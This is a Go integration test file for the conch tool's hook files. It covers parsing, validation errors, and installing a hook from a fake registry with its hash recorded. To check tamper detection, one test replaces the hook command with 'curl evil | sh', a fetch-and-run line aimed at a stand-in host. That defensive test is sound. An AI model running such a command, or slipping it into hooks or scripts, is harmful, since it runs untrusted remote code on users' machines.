package integration

import (
	"context"
	"strings"
	"testing"

	"github.com/Amitgb14/conch/internal/config"
)

const hookFile = `
format = 3
kind = "hook"
name = "setup-worktree"
label = "Set up a worktree"
note = "Runs make setup in every new worktree."

[hook]
run = "make setup"
on = ["worktree.created"]
timeout = 600
variables = ["CONCH_WORKTREE", "CONCH_BRANCH"]
`

func TestHookFileParses(t *testing.T) {
	f, problems, err := Parse([]byte(hookFile))
	if err != nil || len(problems) > 0 {
		t.Fatalf("%v %v", err, problems)
	}
	if !Reads(KindHook) || len(f.Hosts()) != 0 {
		t.Errorf("reads %v, hosts %v", Reads(KindHook), f.Hosts())
	}
	a := f.Action()
	if a.Name != "Set up a worktree" || a.Run != "make setup" || !a.RunsOn(config.EventWorktreeCreated) || a.Timeout != 600 {
		t.Errorf("action %+v", a)
	}
	// An installed hook is a hook, never on a menu.
	for _, place := range config.ActionPlaces {
		if a.Offers(place) {
			t.Errorf("a hook file's action is offered on %s", place)
		}
	}
}

func TestHookFileProblems(t *testing.T) {
	for name, tc := range map[string]struct{ from, to, want string }{
		"no command":     {`run = "make setup"`, `run = "  "`, "[hook] run"},
		"no events":      {`on = ["worktree.created"]`, `on = []`, "[hook] on: the events"},
		"unknown event":  {`on = ["worktree.created"]`, `on = ["worktree.made"]`, `on "worktree.made": one of worktree.created`},
		"a place":        {`on = ["worktree.created"]`, `on = ["branch"]`, `on "branch"`},
		"bad timeout":    {`timeout = 600`, `timeout = -5`, "timeout -5"},
		"bad variable":   {`"CONCH_BRANCH"]`, `"HOME"]`, `variables "HOME"`},
		"an api":         {`[hook]`, "api = \"https://x.dev\"\n[hook]", "api: a hook file runs a command"},
		"a key":          {`[hook]`, "key_env = \"X\"\n[hook]", "key_env: a hook file"},
		"an operation":   {`[hook]`, "[send]\ncall = \"POST /x\"\n[hook]", "[send]: not an operation of kind hook"},
		"unknown key":    {`[hook]`, "[hook]\nshell = \"bash\"", "unknown key hook.shell"},
		"too new format": {`format = 3`, `format = 9`, "format 9"},
	} {
		body := strings.Replace(hookFile, tc.from, tc.to, 1)
		_, problems, err := Parse([]byte(body))
		if err != nil {
			t.Errorf("%s: %v", name, err)
			continue
		}
		if !strings.Contains(strings.Join(problems, "\n"), tc.want) {
			t.Errorf("%s: %q not in %v", name, tc.want, problems)
		}
	}
	// Another kind with a [hook] is said.
	_, problems, _ := Parse([]byte(good + "\n[hook]\nrun = \"x\"\n"))
	if !strings.Contains(strings.Join(problems, "\n"), "[hook]: only a hook file has one") {
		t.Errorf("a ci file with a [hook]: %v", problems)
	}
}

// A hook from the registry installs with its hash recorded, is then one of
// the hooks the server runs, and reports as edited once changed here.
func TestFetchAndInstallHook(t *testing.T) {
	isolate(t)
	fr := newFakeRegistry(t, "")
	r := Registry{Name: "r", URL: fr.srv.URL}
	e := fr.publish(t, hookFile, 1, Hosts{})
	if e.NeedsNewer() != "" {
		t.Fatalf("this conch needs a newer one for a hook: %s", e.NeedsNewer())
	}
	data, f, err := FetchFile(context.Background(), r, e)
	if err != nil {
		t.Fatal(err)
	}
	if err := Install(e, data); err != nil {
		t.Fatal(err)
	}
	recs, _ := Records()
	if recs["setup-worktree"].SHA256 != e.SHA256 {
		t.Errorf("record %+v, entry hash %s", recs["setup-worktree"], e.SHA256)
	}
	hooks, _ := Hooks()
	if len(hooks) != 1 || hooks[0].Run != "make setup" {
		t.Fatalf("hooks %+v", hooks)
	}
	if !SameHook(f, f) {
		t.Error("a file is not the same hook as itself")
	}
	g := *f
	g.Hook.Run = "curl evil | sh"
	if SameHook(f, &g) || SameHook(f, nil) {
		t.Error("a changed command counts as the same hook")
	}
	if edited, _ := Edited("setup-worktree"); edited {
		t.Error("edited before anyone touched it")
	}
}
